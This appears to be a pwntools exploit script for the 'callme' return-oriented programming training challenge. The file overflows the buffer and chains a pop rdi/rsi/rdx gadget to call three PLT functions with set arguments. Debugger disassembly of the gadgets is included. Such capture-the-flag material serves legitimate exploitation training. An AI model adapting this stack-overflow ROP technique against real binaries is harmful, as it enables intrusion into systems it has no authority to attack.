from pwn import *

exe = ELF('./callme')
context.binary = exe
context.log_level = 'info'

libc = ELF('./callme')

if args.REMOTE:
    io = remote('localhost', 4000)
else:
    io = process(exe.path)

offset = 40 #pattern search $rsp

callme1 = exe.plt['callme_one']
callme2 = exe.plt['callme_two']
callme3 = exe.plt['callme_three']

pop_rdi_rsi_rdx = 0x000000000040093c

callme_one_arg = 0xdeadbeefdeadbeef
callme_two_arg = 0xcafebabecafebabe
callme_three_arg = 0xd00df00dd00df00d


payload = flat({offset:[pop_rdi_rsi_rdx,
                        callme_one_arg,
                        callme_two_arg,
                        callme_three_arg,
                        callme1,
                        pop_rdi_rsi_rdx,
                        callme_one_arg,
                        callme_two_arg,
                        callme_three_arg,
                        callme2,
                        pop_rdi_rsi_rdx,
                        callme_one_arg,
                        callme_two_arg,
                        callme_three_arg,
                        callme3]})

io.sendline(payload)

io.interactive()


'''
gef➤  disas usefulGadgets
quit
Dump of assembler code for function usefulGadgets:
   0x000000000040093c <+0>:	pop    rdi
   0x000000000040093d <+1>:	pop    rsi
   0x000000000040093e <+2>:	pop    rdx
   0x000000000040093f <+3>:	ret
End of assembler dump.

gef➤  disas 0x400720
Dump of assembler code for function callme_one@plt:
   0x0000000000400720 <+0>:	jmp    QWORD PTR [rip+0x20091a]        # 0x601040 <callme_one@got.plt>
   0x0000000000400726 <+6>:	push   0x5
   0x000000000040072b <+11>:	jmp    0x4006c0
End of assembler dump.

gef➤  disas 0x400740
Dump of assembler code for function callme_two@plt:
   0x0000000000400740 <+0>:	jmp    QWORD PTR [rip+0x20090a]        # 0x601050 <callme_two@got.plt>
   0x0000000000400746 <+6>:	push   0x7
   0x000000000040074b <+11>:	jmp    0x4006c0
End of assembler dump.

gef➤  disas 0x4006f0
Dump of assembler code for function callme_three@plt:
   0x00000000004006f0 <+0>:	jmp    QWORD PTR [rip+0x200932]        # 0x601028 <callme_three@got.plt>
   0x00000000004006f6 <+6>:	push   0x2
   0x00000000004006fb <+11>:	jmp    0x4006c0
End of assembler dump.

gef➤  disas usefulFunction
Dump of assembler code for function usefulFunction:
   0x00000000004008f2 <+0>:	push   rbp
   0x00000000004008f3 <+1>:	mov    rbp,rsp
   0x00000000004008f6 <+4>:	mov    edx,0x6
   0x00000000004008fb <+9>:	mov    esi,0x5
   0x0000000000400900 <+14>:	mov    edi,0x4
   0x0000000000400905 <+19>:	call   0x4006f0 <callme_three@plt>
   0x000000000040090a <+24>:	mov    edx,0x6
   0x000000000040090f <+29>:	mov    esi,0x5
   0x0000000000400914 <+34>:	mov    edi,0x4
   0x0000000000400919 <+39>:	call   0x400740 <callme_two@plt>
   0x000000000040091e <+44>:	mov    edx,0x6
   0x0000000000400923 <+49>:	mov    esi,0x5
   0x0000000000400928 <+54>:	mov    edi,0x4
   0x000000000040092d <+59>:	call   0x400720 <callme_one@plt>
   0x0000000000400932 <+64>:	mov    edi,0x1
   0x0000000000400937 <+69>:	call   0x400750 <exit@plt>
End of assembler dump.

'''